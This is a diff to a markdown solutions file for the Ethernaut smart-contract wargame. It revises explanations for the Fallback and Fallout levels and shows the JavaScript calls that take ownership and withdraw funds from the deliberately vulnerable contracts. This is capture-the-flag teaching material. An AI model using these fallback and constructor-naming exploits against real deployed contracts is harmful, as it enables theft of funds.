@@ -1,7 +1,7 @@
 # Ethernaut solution
 
 ## 1. Fallback
-Abusing erroneous logic between the functions and fallback function
+Abusing erroneous logic between contract functions and fallback function
 ```
 await contract.contribute({value: 1234});
 await contract.sendTransaction({value: 1234});
@@ -9,7 +9,7 @@ await contract.withdraw();
 ```
 
 ## 2. Fallout
-Constructor is spelled wrongly; becomes a regular function
+Constructor is spelled wrongly; becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0.
 ```
 await contract.Fal1out({value: 1234});
 await contract.sendAllocation(await contract.owner());
